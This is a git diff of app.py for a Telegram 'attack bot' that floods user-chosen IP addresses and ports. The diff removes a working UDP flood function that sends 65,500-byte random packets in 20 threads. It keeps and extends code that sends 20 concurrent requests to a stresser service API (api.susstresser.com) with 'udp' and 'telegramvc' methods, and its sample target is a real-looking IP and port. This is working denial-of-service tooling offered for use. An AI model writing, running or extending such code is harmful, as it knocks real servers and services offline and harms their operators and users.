@@ -1,10 +1,9 @@
-# app.py - WORKING VERSION WITH API (Railway Compatible)
+# app.py - API Only (20 Concurrent)
 import os
 import logging
 import asyncio
 import threading
 import aiohttp
-import socket
 import time
 from datetime import datetime
 from flask import Flask, jsonify
@@ -38,38 +37,12 @@ def index():
 def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
-# ===== DIRECT UDP ATTACK (FALLBACK) =====
-def udp_direct(target, port, duration, attack_id):
-    """Direct UDP flood - Works without API"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(1)
-        
-        end_time = time.time() + duration
-        packets_sent = 0
-        
-        while time.time() < end_time:
-            try:
-                payload = os.urandom(65500)
-                sock.sendto(payload, (target, port))
-                packets_sent += 1
-                if packets_sent % 1000 == 0:
-                    logger.info(f"Attack {attack_id}: Sent {packets_sent} packets")
-            except:
-                pass
-        
-        sock.close()
-        return packets_sent
-    except Exception as e:
-        logger.error(f"Attack {attack_id} failed: {e}")
-        return 0
-
 # ===== API ATTACK =====
 async def api_attack(target, port, duration, attack_id):
-    """Send attack via API - This worked on Railway"""
+    """Send attack via API"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Try different methods that worked before
+    # Try different methods
     methods = ["udp", "telegramvc"]
     
     for method in methods:
@@ -91,67 +64,64 @@ async def api_attack(target, port, duration, attack_id):
         try:
             timeout = aiohttp.ClientTimeout(total=10)
             async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
                 async with session.get(url, params=params, headers=headers) as response:
+                    elapsed = time.time() - start_time
+                    result_text = await response.text()
+                    
                     if response.status == 200:
                         logger.info(f"✅ API Attack {attack_id} SUCCESS with method {method}")
                         return {
                             "success": True,
+                            "attack_id": attack_id,
                             "method": method,
-                            "status": response.status
+                            "status": response.status,
+                            "elapsed": f"{elapsed:.2f}s",
+                            "response": result_text[:100] if result_text else "Success"
                         }
+                    else:
+                        logger.info(f"⚠️ API Attack {attack_id} returned {response.status}")
+                        
         except Exception as e:
-            logger.error(f"API Attack {attack_id} failed: {e}")
+            logger.error(f"API Attack {attack_id} with method {method} failed: {e}")
             continue
     
-    return {"success": False, "method": "failed"}
+    return {
+        "success": False,
+        "attack_id": attack_id,
+        "method": "failed",
+        "error": "All methods failed"
+    }
 
-# ===== 20 CONCURRENT ATTACKS =====
-async def start_20_attacks(target, port, duration):
-    """Launch 20 concurrent attacks using API first, fallback to direct UDP"""
-    logger.info(f"🔥 Starting 20 concurrent attacks on {target}:{port} for {duration}s")
+# ===== 20 CONCURRENT API ATTACKS =====
+async def start_20_api_attacks(target, port, duration):
+    """Launch 20 concurrent API attacks"""
+    logger.info(f"🔥 Starting 20 concurrent API attacks on {target}:{port} for {duration}s")
     
-    # Try API first
-    api_tasks = []
+    # Create 20 attack tasks
+    tasks = []
     for i in range(1, 21):
         task = api_attack(target, port, duration, i)
-        api_tasks.append(task)
+        tasks.append(task)
     
-    api_results = await asyncio.gather(*api_tasks)
-    api_success = sum(1 for r in api_results if r.get('success', False))
+    # Run all 20 attacks concurrently
+    results = await asyncio.gather(*tasks)
     
-    logger.info(f"API Success: {api_success}/20")
+    # Count successes
+    success_count = sum(1 for r in results if r.get('success', False))
+    total_time = sum(float(r.get('elapsed', '0').replace('s', '')) for r in results if r.get('elapsed'))
     
-    # If API fails, use direct UDP
-    if api_success < 10:
-        logger.info("⚠️ Low API success, using direct UDP...")
-        
-        # Run direct UDP attacks in threads
-        direct_results = []
-        threads = []
-        
-        for i in range(1, 21):
-            t = threading.Thread(target=lambda i=i: direct_results.append((i, udp_direct(target, port, duration, i))))
-            t.start()
-            threads.append(t)
-        
-        for t in threads:
-            t.join()
-        
-        total_packets = sum(r[1] for r in direct_results)
-        logger.info(f"✅ Direct UDP complete! Total packets: {total_packets}")
-        
-        return {
-            "success": total_packets > 0,
-            "total_packets": total_packets,
-            "method": "direct_udp",
-            "api_success": api_success
-        }
+    logger.info(f"✅ API Attacks complete: {success_count}/20 successful")
     
     return {
-        "success": True,
-        "total_packets": 0,
-        "method": "api",
-        "api_success": api_success
+        "success": success_count > 0,
+        "total_attacks": len(results),
+        "successful": success_count,
+        "failed": len(results) - success_count,
+        "results": results,
+        "target": target,
+        "port": port,
+        "duration": duration
     }
 
 # ===== BOT HANDLERS =====
@@ -161,13 +131,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📊 STATUS", callback_data="status")],
     ]
     if update.effective_user.id == OWNER_ID:
-        keyboard.append([InlineKeyboardButton("🔬 CHECK API", callback_data="check_api")])
+        keyboard.append([InlineKeyboardButton("🔬 TEST API", callback_data="test_api")])
     
     await update.message.reply_text(
-        "⚡ *UDP ATTACK BOT*\n\n"
-        "🔥 20 Concurrent UDP Attacks\n"
-        "📦 Packet Size: 65,500 bytes\n"
-        "💪 API + Direct UDP\n\n"
+        "⚡ *API ATTACK BOT*\n\n"
+        "🔥 20 Concurrent API Attacks\n"
+        "💪 API Powered\n\n"
         "Send: `/attack IP PORT TIME`\n"
         "Example: `/attack 91.108.13.37 32001 60`\n\n"
         "⏱️ Time: 60-300 seconds",
@@ -201,48 +170,47 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 *ATTACK STARTED*\n\n"
+            f"🚀 *API ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
             f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `65,500 bytes`\n\n"
-            f"⏳ Sending attacks...",
+            f"🔑 API: `{API_KEY[:10]}...`\n\n"
+            f"⏳ Sending 20 API attacks...",
             parse_mode='Markdown'
         )
         
-        result = await start_20_attacks(target, port, duration)
+        result = await start_20_api_attacks(target, port, duration)
         
         if result.get('success'):
-            if result.get('method') == 'api':
-                response_text = (
-                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
-                    f"🎯 Target: `{target}`\n"
-                    f"📡 Port: `{port}`\n"
-                    f"⏱️ Time: `{duration}s`\n"
-                    f"📊 Method: API\n"
-                    f"✅ API Success: `{result.get('api_success', 0)}/20`\n"
-                    f"⚡ Attacks: `20 CONCURRENT`\n"
-                    f"📊 Status: ✅ SUCCESS"
-                )
-            else:
-                response_text = (
-                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
-                    f"🎯 Target: `{target}`\n"
-                    f"📡 Port: `{port}`\n"
-                    f"⏱️ Time: `{duration}s`\n"
-                    f"📊 Method: Direct UDP\n"
-                    f"📦 Packets Sent: `{result.get('total_packets', 0):,}`\n"
-                    f"⚡ Attacks: `20 CONCURRENT`\n"
-                    f"📊 Status: ✅ SUCCESS"
-                )
-        else:
             response_text = (
-                f"❌ *ATTACK FAILED*\n\n"
+                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"📊 Status: ❌ FAILED"
+                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
+                f"❌ Failed: `{result['failed']}`\n"
+                f"⚡ Status: ✅ SUCCESS\n\n"
+                f"📊 *Attack Results:*\n"
+            )
+            
+            for r in result['results'][:10]:
+                status = "✅" if r.get('success') else "❌"
+                method = r.get('method', 'N/A')
+                status_code = r.get('status', 'N/A')
+                elapsed = r.get('elapsed', 'N/A')
+                response_text += f"{status} Attack {r.get('attack_id', 'N/A')}: {method} - {status_code} ({elapsed})\n"
+            
+            if len(result['results']) > 10:
+                response_text += f"... and {len(result['results']) - 10} more\n"
+        else:
+            response_text = (
+                f"❌ *API ATTACK FAILED*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Status: ❌ FAILED\n\n"
+                f"Check API key or connection."
             )
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
@@ -257,7 +225,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     await query.edit_message_text(
-        "💥 *ATTACK*\n\n"
+        "💥 *API ATTACK*\n\n"
         "Send: `IP PORT TIME`\n"
         "Example: `91.108.13.37 32001 60`\n\n"
         "⏱️ Time: 60-300 seconds\n"
@@ -292,41 +260,29 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 *ATTACK STARTED*\n\n"
+            f"🚀 *API ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
             f"⚡ Attacks: `20 CONCURRENT`\n\n"
-            f"⏳ Sending attacks...",
+            f"⏳ Sending API attacks...",
             parse_mode='Markdown'
         )
         
-        result = await start_20_attacks(target, port, duration)
+        result = await start_20_api_attacks(target, port, duration)
         
         if result.get('success'):
-            if result.get('method') == 'api':
-                response_text = (
-                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
-                    f"🎯 Target: `{target}`\n"
-                    f"📡 Port: `{port}`\n"
-                    f"⏱️ Time: `{duration}s`\n"
-                    f"📊 Method: API\n"
-                    f"✅ API Success: `{result.get('api_success', 0)}/20`\n"
-                    f"📊 Status: ✅ SUCCESS"
-                )
-            else:
-                response_text = (
-                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
-                    f"🎯 Target: `{target}`\n"
-                    f"📡 Port: `{port}`\n"
-                    f"⏱️ Time: `{duration}s`\n"
-                    f"📊 Method: Direct UDP\n"
-                    f"📦 Packets Sent: `{result.get('total_packets', 0):,}`\n"
-                    f"📊 Status: ✅ SUCCESS"
-                )
+            response_text = (
+                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
+                f"⚡ Status: ✅ SUCCESS"
+            )
         else:
             response_text = (
-                f"❌ *ATTACK FAILED*\n\n"
+                f"❌ *API ATTACK FAILED*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
@@ -340,22 +296,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
-async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "📊 *BOT STATUS*\n\n"
-        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
-        f"📦 Packet Size: 65,500 bytes\n"
-        f"🌐 Status: ONLINE\n"
-        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n\n"
-        f"📌 /attack IP PORT TIME",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
-async def check_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
@@ -377,7 +318,7 @@ async def check_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
                     f"🔬 *API TEST RESULTS*\n\n"
                     f"📡 Status: {response.status}\n"
                     f"🔑 API Key: {API_KEY[:10]}...{API_KEY[-4:] if len(API_KEY) > 14 else ''}\n"
-                    f"📝 Response: {text[:200]}\n\n"
+                    f"📝 Response: {text[:300]}\n\n"
                     f"{'✅ API is responding!' if response.status == 200 else '❌ API Error!'}",
                     parse_mode='Markdown',
                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
@@ -389,6 +330,20 @@ async def check_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
         )
 
+async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    await query.edit_message_text(
+        "📊 *BOT STATUS*\n\n"
+        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
+        f"🌐 Status: ONLINE\n"
+        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n\n"
+        f"📌 /attack IP PORT TIME",
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
+    )
+
 async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -398,13 +353,12 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📊 STATUS", callback_data="status")],
     ]
     if query.from_user.id == OWNER_ID:
-        keyboard.append([InlineKeyboardButton("🔬 CHECK API", callback_data="check_api")])
+        keyboard.append([InlineKeyboardButton("🔬 TEST API", callback_data="test_api")])
     
     await query.edit_message_text(
-        "⚡ *UDP ATTACK BOT*\n\n"
-        "🔥 20 Concurrent UDP Attacks\n"
-        "📦 Packet Size: 65,500 bytes\n"
-        "💪 API + Direct UDP\n\n"
+        "⚡ *API ATTACK BOT*\n\n"
+        "🔥 20 Concurrent API Attacks\n"
+        "💪 API Powered\n\n"
         "Send: `/attack IP PORT TIME`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -427,7 +381,7 @@ def run_bot():
     
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
-    app.add_handler(CallbackQueryHandler(check_api_callback, pattern="^check_api$"))
+    app.add_handler(CallbackQueryHandler(test_api_callback, pattern="^test_api$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
     
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
@@ -441,10 +395,9 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("⚡ UDP ATTACK BOT")
-    print("🔥 20 Concurrent Attacks")
-    print("📦 Packet Size: 65,500 bytes")
-    print("💪 API + Direct UDP")
+    print("⚡ API ATTACK BOT")
+    print("🔥 20 Concurrent API Attacks")
+    print("💪 API Powered")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
